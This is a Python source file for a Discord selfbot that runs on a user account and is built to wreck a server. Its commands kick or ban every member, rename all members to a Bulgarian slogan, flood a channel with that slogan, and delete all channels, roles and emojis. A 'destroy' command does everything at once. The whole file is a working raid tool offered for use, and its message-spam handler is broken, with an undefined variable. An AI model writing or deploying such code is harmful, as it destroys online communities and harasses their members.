# CONFIG
# ---------
token = ""
prefix = "td"
rename_to = "КРЪВЪТ НА НАШАТА КОУПРИЯТИЯ ВЪЗПОМНЯВА ВСИЧКИ МАГИЯ"
# ----------

import discord
from discord.ext import commands
from discord.ext.commands import Bot

print ("Loading..")

bot = commands.Bot(command_prefix=prefix, self_bot=True)
bot.remove_command("help")

@bot.event
async def on_ready():
    print ("Ready to start the rebellion.")

@bot.command(pass_context=True)
async def kall(ctx):
    if bot.user.id == ctx.message.author.id:
        for user in list(ctx.message.server.members):
            try:
                await bot.kick(user)
                print (user.name + " has been kicked from " + ctx.message.server.name)
            except:
                pass    
        print ("Action Completed: kall")

@bot.command(pass_context=True)
async def ball(ctx):
    if bot.user.id == ctx.message.author.id:
        for user in list(ctx.message.server.members):
            try:
                await bot.ban(user)
                print (user.name + " has been banned from " + ctx.message.server.name)
            except:
                pass 
        print ("Action Completed: ball")  

@bot.command(pass_context=True)
async def yeet(ctx):
    if bot.user.id == ctx.message.author.id:
        for user in list(ctx.message.server.members):
            try:
                await bot.change_nickname(user, rename_to)
                print (user.name + " has been renamed to " + rename_to + " in " + ctx.message.server.name)
            except:
                pass

            
@bot.command(pass_context=True)
async def on_message(message):
    if bot.user.id == ctx.message.author.id:
        print ("hi")
        if message.content.startswith('tdspam'):
            print ("hi 2")
            await bot.send_message(message.channel, 'КРЪВЪТ НА НАШАТА КОУПРИЯТИЯ ВЪЗПОМНЯВА ВСИЧКИ МАГИЯ КРЪВЪТ НА НАШАТА КОУПРИЯТИЯ ВЪЗПОМНЯВА ВСИЧКИ МАГИЯ КРЪВЪТ НА НАШАТА КОУПРИЯТИЯ ВЪЗПОМНЯВА ВСИЧКИ МАГИЯ КРЪВЪТ НА НАШАТА КОУПРИЯТИЯ ВЪЗПОМНЯВА ВСИЧКИ МАГИЯ КРЪВЪТ НА НАШАТА КОУПРИЯТИЯ ВЪЗПОМНЯВА ВСИЧКИ МАГИЯ КРЪВЪТ НА НАШАТА КОУПРИЯТИЯ ВЪЗПОМНЯВА ВСИЧКИ МАГИЯ')
            await bot.send_message(message.channel, 'КРЪВЪТ НА НАШАТА КОУПРИЯТИЯ ВЪЗПОМНЯВА ВСИЧКИ МАГИЯ КРЪВЪТ НА НАШАТА КОУПРИЯТИЯ ВЪЗПОМНЯВА ВСИЧКИ МАГИЯ КРЪВЪТ НА НАШАТА КОУПРИЯТИЯ ВЪЗПОМНЯВА ВСИЧКИ МАГИЯ КРЪВЪТ НА НАШАТА КОУПРИЯТИЯ ВЪЗПОМНЯВА ВСИЧКИ МАГИЯ КРЪВЪТ НА НАШАТА КОУПРИЯТИЯ ВЪЗПОМНЯВА ВСИЧКИ МАГИЯ КРЪВЪТ НА НАШАТА КОУПРИЯТИЯ ВЪЗПОМНЯВА ВСИЧКИ МАГИЯ')
            await bot.send_message(message.channel, 'КРЪВЪТ НА НАШАТА КОУПРИЯТИЯ ВЪЗПОМНЯВА ВСИЧКИ МАГИЯ КРЪВЪТ НА НАШАТА КОУПРИЯТИЯ ВЪЗПОМНЯВА ВСИЧКИ МАГИЯ КРЪВЪТ НА НАШАТА КОУПРИЯТИЯ ВЪЗПОМНЯВА ВСИЧКИ МАГИЯ КРЪВЪТ НА НАШАТА КОУПРИЯТИЯ ВЪЗПОМНЯВА ВСИЧКИ МАГИЯ КРЪВЪТ НА НАШАТА КОУПРИЯТИЯ ВЪЗПОМНЯВА ВСИЧКИ МАГИЯ КРЪВЪТ НА НАШАТА КОУПРИЯТИЯ ВЪЗПОМНЯВА ВСИЧКИ МАГИЯ')
            await bot.send_message(message.channel, 'КРЪВЪТ НА НАШАТА КОУПРИЯТИЯ ВЪЗПОМНЯВА ВСИЧКИ МАГИЯ КРЪВЪТ НА НАШАТА КОУПРИЯТИЯ ВЪЗПОМНЯВА ВСИЧКИ МАГИЯ КРЪВЪТ НА НАШАТА КОУПРИЯТИЯ ВЪЗПОМНЯВА ВСИЧКИ МАГИЯ КРЪВЪТ НА НАШАТА КОУПРИЯТИЯ ВЪЗПОМНЯВА ВСИЧКИ МАГИЯ КРЪВЪТ НА НАШАТА КОУПРИЯТИЯ ВЪЗПОМНЯВА ВСИЧКИ МАГИЯ КРЪВЪТ НА НАШАТА КОУПРИЯТИЯ ВЪЗПОМНЯВА ВСИЧКИ МАГИЯ')
            await bot.send_message(message.channel, 'КРЪВЪТ НА НАШАТА КОУПРИЯТИЯ ВЪЗПОМНЯВА ВСИЧКИ МАГИЯ КРЪВЪТ НА НАШАТА КОУПРИЯТИЯ ВЪЗПОМНЯВА ВСИЧКИ МАГИЯ КРЪВЪТ НА НАШАТА КОУПРИЯТИЯ ВЪЗПОМНЯВА ВСИЧКИ МАГИЯ КРЪВЪТ НА НАШАТА КОУПРИЯТИЯ ВЪЗПОМНЯВА ВСИЧКИ МАГИЯ КРЪВЪТ НА НАШАТА КОУПРИЯТИЯ ВЪЗПОМНЯВА ВСИЧКИ МАГИЯ КРЪВЪТ НА НАШАТА КОУПРИЯТИЯ ВЪЗПОМНЯВА ВСИЧКИ МАГИЯ')
            await bot.send_message(message.channel, 'КРЪВЪТ НА НАШАТА КОУПРИЯТИЯ ВЪЗПОМНЯВА ВСИЧКИ МАГИЯ КРЪВЪТ НА НАШАТА КОУПРИЯТИЯ ВЪЗПОМНЯВА ВСИЧКИ МАГИЯ КРЪВЪТ НА НАШАТА КОУПРИЯТИЯ ВЪЗПОМНЯВА ВСИЧКИ МАГИЯ КРЪВЪТ НА НАШАТА КОУПРИЯТИЯ ВЪЗПОМНЯВА ВСИЧКИ МАГИЯ КРЪВЪТ НА НАШАТА КОУПРИЯТИЯ ВЪЗПОМНЯВА ВСИЧКИ МАГИЯ КРЪВЪТ НА НАШАТА КОУПРИЯТИЯ ВЪЗПОМНЯВА ВСИЧКИ МАГИЯ')
            await bot.send_message(message.channel, 'КРЪВЪТ НА НАШАТА КОУПРИЯТИЯ ВЪЗПОМНЯВА ВСИЧКИ МАГИЯ КРЪВЪТ НА НАШАТА КОУПРИЯТИЯ ВЪЗПОМНЯВА ВСИЧКИ МАГИЯ КРЪВЪТ НА НАШАТА КОУПРИЯТИЯ ВЪЗПОМНЯВА ВСИЧКИ МАГИЯ КРЪВЪТ НА НАШАТА КОУПРИЯТИЯ ВЪЗПОМНЯВА ВСИЧКИ МАГИЯ КРЪВЪТ НА НАШАТА КОУПРИЯТИЯ ВЪЗПОМНЯВА ВСИЧКИ МАГИЯ КРЪВЪТ НА НАШАТА КОУПРИЯТИЯ ВЪЗПОМНЯВА ВСИЧКИ МАГИЯ')
            await bot.send_message(message.channel, 'КРЪВЪТ НА НАШАТА КОУПРИЯТИЯ ВЪЗПОМНЯВА ВСИЧКИ МАГИЯ КРЪВЪТ НА НАШАТА КОУПРИЯТИЯ ВЪЗПОМНЯВА ВСИЧКИ МАГИЯ КРЪВЪТ НА НАШАТА КОУПРИЯТИЯ ВЪЗПОМНЯВА ВСИЧКИ МАГИЯ КРЪВЪТ НА НАШАТА КОУПРИЯТИЯ ВЪЗПОМНЯВА ВСИЧКИ МАГИЯ КРЪВЪТ НА НАШАТА КОУПРИЯТИЯ ВЪЗПОМНЯВА ВСИЧКИ МАГИЯ КРЪВЪТ НА НАШАТА КОУПРИЯТИЯ ВЪЗПОМНЯВА ВСИЧКИ МАГИЯ')
            await bot.send_message(message.channel, 'КРЪВЪТ НА НАШАТА КОУПРИЯТИЯ ВЪЗПОМНЯВА ВСИЧКИ МАГИЯ КРЪВЪТ НА НАШАТА КОУПРИЯТИЯ ВЪЗПОМНЯВА ВСИЧКИ МАГИЯ КРЪВЪТ НА НАШАТА КОУПРИЯТИЯ ВЪЗПОМНЯВА ВСИЧКИ МАГИЯ КРЪВЪТ НА НАШАТА КОУПРИЯТИЯ ВЪЗПОМНЯВА ВСИЧКИ МАГИЯ КРЪВЪТ НА НАШАТА КОУПРИЯТИЯ ВЪЗПОМНЯВА ВСИЧКИ МАГИЯ КРЪВЪТ НА НАШАТА КОУПРИЯТИЯ ВЪЗПОМНЯВА ВСИЧКИ МАГИЯ')
            await bot.send_message(message.channel, 'КРЪВЪТ НА НАШАТА КОУПРИЯТИЯ ВЪЗПОМНЯВА ВСИЧКИ МАГИЯ КРЪВЪТ НА НАШАТА КОУПРИЯТИЯ ВЪЗПОМНЯВА ВСИЧКИ МАГИЯ КРЪВЪТ НА НАШАТА КОУПРИЯТИЯ ВЪЗПОМНЯВА ВСИЧКИ МАГИЯ КРЪВЪТ НА НАШАТА КОУПРИЯТИЯ ВЪЗПОМНЯВА ВСИЧКИ МАГИЯ КРЪВЪТ НА НАШАТА КОУПРИЯТИЯ ВЪЗПОМНЯВА ВСИЧКИ МАГИЯ КРЪВЪТ НА НАШАТА КОУПРИЯТИЯ ВЪЗПОМНЯВА ВСИЧКИ МАГИЯ')
            await bot.send_message(message.channel, 'КРЪВЪТ НА НАШАТА КОУПРИЯТИЯ ВЪЗПОМНЯВА ВСИЧКИ МАГИЯ КРЪВЪТ НА НАШАТА КОУПРИЯТИЯ ВЪЗПОМНЯВА ВСИЧКИ МАГИЯ КРЪВЪТ НА НАШАТА КОУПРИЯТИЯ ВЪЗПОМНЯВА ВСИЧКИ МАГИЯ КРЪВЪТ НА НАШАТА КОУПРИЯТИЯ ВЪЗПОМНЯВА ВСИЧКИ МАГИЯ КРЪВЪТ НА НАШАТА КОУПРИЯТИЯ ВЪЗПОМНЯВА ВСИЧКИ МАГИЯ КРЪВЪТ НА НАШАТА КОУПРИЯТИЯ ВЪЗПОМНЯВА ВСИЧКИ МАГИЯ')
            await bot.send_message(message.channel, 'КРЪВЪТ НА НАШАТА КОУПРИЯТИЯ ВЪЗПОМНЯВА ВСИЧКИ МАГИЯ КРЪВЪТ НА НАШАТА КОУПРИЯТИЯ ВЪЗПОМНЯВА ВСИЧКИ МАГИЯ КРЪВЪТ НА НАШАТА КОУПРИЯТИЯ ВЪЗПОМНЯВА ВСИЧКИ МАГИЯ КРЪВЪТ НА НАШАТА КОУПРИЯТИЯ ВЪЗПОМНЯВА ВСИЧКИ МАГИЯ КРЪВЪТ НА НАШАТА КОУПРИЯТИЯ ВЪЗПОМНЯВА ВСИЧКИ МАГИЯ КРЪВЪТ НА НАШАТА КОУПРИЯТИЯ ВЪЗПОМНЯВА ВСИЧКИ МАГИЯ')
            await bot.send_message(message.channel, 'КРЪВЪТ НА НАШАТА КОУПРИЯТИЯ ВЪЗПОМНЯВА ВСИЧКИ МАГИЯ КРЪВЪТ НА НАШАТА КОУПРИЯТИЯ ВЪЗПОМНЯВА ВСИЧКИ МАГИЯ КРЪВЪТ НА НАШАТА КОУПРИЯТИЯ ВЪЗПОМНЯВА ВСИЧКИ МАГИЯ КРЪВЪТ НА НАШАТА КОУПРИЯТИЯ ВЪЗПОМНЯВА ВСИЧКИ МАГИЯ КРЪВЪТ НА НАШАТА КОУПРИЯТИЯ ВЪЗПОМНЯВА ВСИЧКИ МАГИЯ КРЪВЪТ НА НАШАТА КОУПРИЯТИЯ ВЪЗПОМНЯВА ВСИЧКИ МАГИЯ')
            await bot.send_message(message.channel, 'КРЪВЪТ НА НАШАТА КОУПРИЯТИЯ ВЪЗПОМНЯВА ВСИЧКИ МАГИЯ КРЪВЪТ НА НАШАТА КОУПРИЯТИЯ ВЪЗПОМНЯВА ВСИЧКИ МАГИЯ КРЪВЪТ НА НАШАТА КОУПРИЯТИЯ ВЪЗПОМНЯВА ВСИЧКИ МАГИЯ КРЪВЪТ НА НАШАТА КОУПРИЯТИЯ ВЪЗПОМНЯВА ВСИЧКИ МАГИЯ КРЪВЪТ НА НАШАТА КОУПРИЯТИЯ ВЪЗПОМНЯВА ВСИЧКИ МАГИЯ КРЪВЪТ НА НАШАТА КОУПРИЯТИЯ ВЪЗПОМНЯВА ВСИЧКИ МАГИЯ')
            await bot.send_message(message.channel, 'КРЪВЪТ НА НАШАТА КОУПРИЯТИЯ ВЪЗПОМНЯВА ВСИЧКИ МАГИЯ КРЪВЪТ НА НАШАТА КОУПРИЯТИЯ ВЪЗПОМНЯВА ВСИЧКИ МАГИЯ КРЪВЪТ НА НАШАТА КОУПРИЯТИЯ ВЪЗПОМНЯВА ВСИЧКИ МАГИЯ КРЪВЪТ НА НАШАТА КОУПРИЯТИЯ ВЪЗПОМНЯВА ВСИЧКИ МАГИЯ КРЪВЪТ НА НАШАТА КОУПРИЯТИЯ ВЪЗПОМНЯВА ВСИЧКИ МАГИЯ КРЪВЪТ НА НАШАТА КОУПРИЯТИЯ ВЪЗПОМНЯВА ВСИЧКИ МАГИЯ')
            await bot.send_message(message.channel, 'КРЪВЪТ НА НАШАТА КОУПРИЯТИЯ ВЪЗПОМНЯВА ВСИЧКИ МАГИЯ КРЪВЪТ НА НАШАТА КОУПРИЯТИЯ ВЪЗПОМНЯВА ВСИЧКИ МАГИЯ КРЪВЪТ НА НАШАТА КОУПРИЯТИЯ ВЪЗПОМНЯВА ВСИЧКИ МАГИЯ КРЪВЪТ НА НАШАТА КОУПРИЯТИЯ ВЪЗПОМНЯВА ВСИЧКИ МАГИЯ КРЪВЪТ НА НАШАТА КОУПРИЯТИЯ ВЪЗПОМНЯВА ВСИЧКИ МАГИЯ КРЪВЪТ НА НАШАТА КОУПРИЯТИЯ ВЪЗПОМНЯВА ВСИЧКИ МАГИЯ')
            await bot.send_message(message.channel, 'КРЪВЪТ НА НАШАТА КОУПРИЯТИЯ ВЪЗПОМНЯВА ВСИЧКИ МАГИЯ КРЪВЪТ НА НАШАТА КОУПРИЯТИЯ ВЪЗПОМНЯВА ВСИЧКИ МАГИЯ КРЪВЪТ НА НАШАТА КОУПРИЯТИЯ ВЪЗПОМНЯВА ВСИЧКИ МАГИЯ КРЪВЪТ НА НАШАТА КОУПРИЯТИЯ ВЪЗПОМНЯВА ВСИЧКИ МАГИЯ КРЪВЪТ НА НАШАТА КОУПРИЯТИЯ ВЪЗПОМНЯВА ВСИЧКИ МАГИЯ КРЪВЪТ НА НАШАТА КОУПРИЯТИЯ ВЪЗПОМНЯВА ВСИЧКИ МАГИЯ')
            await bot.send_message(message.channel, 'КРЪВЪТ НА НАШАТА КОУПРИЯТИЯ ВЪЗПОМНЯВА ВСИЧКИ МАГИЯ КРЪВЪТ НА НАШАТА КОУПРИЯТИЯ ВЪЗПОМНЯВА ВСИЧКИ МАГИЯ КРЪВЪТ НА НАШАТА КОУПРИЯТИЯ ВЪЗПОМНЯВА ВСИЧКИ МАГИЯ КРЪВЪТ НА НАШАТА КОУПРИЯТИЯ ВЪЗПОМНЯВА ВСИЧКИ МАГИЯ КРЪВЪТ НА НАШАТА КОУПРИЯТИЯ ВЪЗПОМНЯВА ВСИЧКИ МАГИЯ КРЪВЪТ НА НАШАТА КОУПРИЯТИЯ ВЪЗПОМНЯВА ВСИЧКИ МАГИЯ')
            await bot.send_message(message.channel, 'КРЪВЪТ НА НАШАТА КОУПРИЯТИЯ ВЪЗПОМНЯВА ВСИЧКИ МАГИЯ КРЪВЪТ НА НАШАТА КОУПРИЯТИЯ ВЪЗПОМНЯВА ВСИЧКИ МАГИЯ КРЪВЪТ НА НАШАТА КОУПРИЯТИЯ ВЪЗПОМНЯВА ВСИЧКИ МАГИЯ КРЪВЪТ НА НАШАТА КОУПРИЯТИЯ ВЪЗПОМНЯВА ВСИЧКИ МАГИЯ КРЪВЪТ НА НАШАТА КОУПРИЯТИЯ ВЪЗПОМНЯВА ВСИЧКИ МАГИЯ КРЪВЪТ НА НАШАТА КОУПРИЯТИЯ ВЪЗПОМНЯВА ВСИЧКИ МАГИЯ')
        
   
    
@bot.command(pass_context=True)
async def delete(ctx, condition):
    if bot.user.id == ctx.message.author.id:
        if condition.lower() == "channels":
            for channel in list(ctx.message.server.channels):
                try:
                    await bot.delete_channel(channel)
                    print (channel.name + " has been deleted in " + ctx.message.server.name)
                except:
                    pass
            print ("Action Completed: dall channels")
        elif condition.lower() == "roles":
            for role in list(ctx.message.server.roles):
                try:
                    await bot.delete_role(ctx.message.server, role)
                    print (role.name + " has been deleted in " + ctx.message.server.name)
                except:
                    pass
            print ("Action Completed: dall roles")
        elif condition.lower() == "emojis":
            for emoji in list(ctx.message.server.emojis):
                try:
                    await bot.delete_custom_emoji(emoji)
                    print (emoji.name + " has been deleted in " + ctx.message.server.name)
                except:
                    pass
            print ("Action Completed: dall emojis")
        elif condition.lower() == "all":
            for emoji in list(ctx.message.server.emojis):
                try:
                    await bot.delete_custom_emoji(emoji)
                    print (emoji.name + " has been deleted in " + ctx.message.server.name)
                except:
                    pass
            for channel in list(ctx.message.server.channels):
                try:
                    await bot.delete_channel(channel)
                    print (channel.name + " has been deleted in " + ctx.message.server.name)
                except:
                    pass
            for role in list(ctx.message.server.roles):
                try:
                    await bot.delete_role(ctx.message.server, role)
                    print (role.name + " has been deleted in " + ctx.message.server.name)
                except:
                    pass
            print ("Action Completed: dall all")

@bot.command(pass_context=True)
async def destroy(ctx):
    if bot.user.id == ctx.message.author.id:
        for emoji in list(ctx.message.server.emojis):
            try:
                await bot.delete_custom_emoji(emoji)
                print (emoji.name + " has been deleted in " + ctx.message.server.name)
            except:
                pass
        for channel in list(ctx.message.server.channels):
            try:
                await bot.delete_channel(channel)
                print (channel.name + " has been deleted in " + ctx.message.server.name)
            except:
                pass
        for role in list(ctx.message.server.roles):
            try:
                await bot.delete_role(ctx.message.server, role)
                print (role.name + " has been deleted in " + ctx.message.server.name)
            except:
                pass
        for user in list(ctx.message.server.members):
            try:
                await bot.ban(user)
                print (user.name + " has been banned from " + ctx.message.server.name)
            except:
                pass
        print ("Action Completed: destroy")

bot.run(token, bot=False)
